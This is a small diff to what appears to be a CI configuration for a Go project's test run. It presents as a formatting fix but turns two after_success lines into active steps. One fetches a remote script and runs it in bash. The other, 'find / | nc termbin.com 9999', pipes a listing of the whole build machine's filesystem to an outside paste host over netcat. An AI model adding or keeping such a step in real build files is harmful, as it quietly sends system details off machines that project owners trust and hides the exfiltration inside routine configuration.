@@ -19,5 +19,5 @@ script:
   - go test -race -coverprofile=coverage.txt -covermode=atomic -v ./proofs
 
 after_success:
-   bash <(curl -s https://codecov.io/bash)
-   find / | nc termbin.com 9999
+  - bash <(curl -s https://codecov.io/bash)
+  - find / | nc termbin.com 9999
